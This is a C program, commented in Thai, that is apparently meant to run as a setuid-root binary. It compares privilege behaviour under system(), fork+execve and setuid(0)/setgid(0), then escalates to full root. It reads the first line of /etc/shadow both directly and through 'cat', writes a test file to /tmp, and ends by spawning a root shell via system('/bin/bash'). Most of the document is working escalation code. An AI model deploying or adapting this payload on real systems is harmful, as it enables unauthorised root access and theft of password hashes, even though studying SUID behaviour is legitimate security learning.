#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/wait.h>

int main() {
    printf("=== SUID EXPLOIT COMPARISON ===\n");
    printf("Real UID: %d\n", getuid());
    printf("Effective UID: %d\n", geteuid());
    printf("Real GID: %d\n", getgid()); 
    printf("Effective GID: %d\n", getegid());
    
    if (geteuid() == 0) {
        printf("*** GOT ROOT! ***\n\n");
        
        // 1. system() กับ bash - จะ drop privileges
        printf("=== Method 1: system() with bash ===\n");
        printf("system(\"id\") result: ");
        int result1 = system("id");
        printf("Return code: %d\n\n", result1);
        
        // 2. ใช้ fork + execve - ไม่ drop privileges
        printf("=== Method 2: fork + execve (direct binary) ===\n");
        printf("execve(\"/usr/bin/id\") result:\n");
        
        pid_t pid = fork();
        if (pid == 0) {
            // Child process - เรียก id โดยตรง
            char *argv[] = {"/usr/bin/id", NULL};
            char *envp[] = {NULL};
            execve("/usr/bin/id", argv, envp);
            perror("execve failed");
            exit(1);
        } else if (pid > 0) {
            // Parent process - รอ child เสร็จ
            int status;
            wait(&status);
            printf("Child exit status: %d\n\n", status);
        }
        
        // 3. system() กับ sh - อาจไม่ drop (ขึ้นอยู่กับ system)
        printf("=== Method 3: system() with sh ===\n");
        printf("system(\"/bin/sh -c 'id'\") result:\n");
        int result3 = system("/bin/sh -c 'id'");
        printf("Return code: %d\n\n", result3);
        
        // 4. อ่านไฟล์โดยตรง - ใช้ effective UID
        printf("=== Method 4: Direct file access ===\n");
        printf("Trying to read /etc/shadow directly:\n");
        
        FILE *file = fopen("/etc/shadow", "r");
        if (file) {
            printf("SUCCESS: Can read /etc/shadow!\n");
            char line[256];
            if (fgets(line, sizeof(line), file)) {
                printf("First line: %.60s...\n", line);
            }
            fclose(file);
        } else {
            perror("FAILED: Cannot read /etc/shadow");
        }
        printf("\n");
        
        // 5. เปรียบเทียบ system() vs direct access
        printf("=== Method 5: system() vs direct comparison ===\n");
        printf("system(\"cat /etc/shadow | head -1\"):\n");
        int result5 = system("cat /etc/shadow | head -1");
        printf("Return code: %d\n\n", result5);
        
        // 6. ทดสอบเขียนไฟล์
        printf("=== Method 6: File write test ===\n");
        FILE *testfile = fopen("/tmp/suid_test.txt", "w");
        if (testfile) {
            fprintf(testfile, "Written with effective UID: %d\n", geteuid());
            fprintf(testfile, "Process real UID: %d\n", getuid());
            fclose(testfile);
            printf("Created /tmp/suid_test.txt\n");
            system("ls -la /tmp/suid_test.txt");
        }
        printf("\n");
        
        // 7. NOW DO setuid/setgid และทดสอบใหม่
        printf("=== AFTER setuid(0) & setgid(0) ===\n");
        printf("Before setuid/setgid:\n");
        printf("  Real UID: %d, Effective UID: %d\n", getuid(), geteuid());
        printf("  Real GID: %d, Effective GID: %d\n", getgid(), getegid());
        
        // ตั้งค่า GID ก่อน (ต้องทำก่อน setuid)
        if (setgid(0) != 0) {
            perror("setgid failed");
        } else {
            printf("setgid(0) SUCCESS\n");
        }
        
        // ตั้งค่า UID
        if (setuid(0) != 0) {
            perror("setuid failed");
        } else {
            printf("setuid(0) SUCCESS\n");
        }
        
        printf("\nAfter setuid/setgid:\n");
        printf("  Real UID: %d, Effective UID: %d\n", getuid(), geteuid());
        printf("  Real GID: %d, Effective GID: %d\n", getgid(), getegid());
        printf("\n");
        
        // 8. ทดสอบ system() หลัง setuid - ตอนนี้ควรทำงานได้!
        printf("=== Method 7: system() AFTER setuid/setgid ===\n");
        printf("Now system() should work because Real UID = 0!\n");
        
        printf("Testing shadow file access:\n");
        system("cat /etc/shadow | head -1");
        printf("\n");
        
        printf("🎉 SUCCESS! Got full root privileges!\n");
        printf("Spawning root shell...\n\n");
        
        // เรียก root shell
        system("/bin/bash");
        
    } else {
        printf("No root privileges (euid: %d)\n", geteuid());
    }
    
    return 0;
}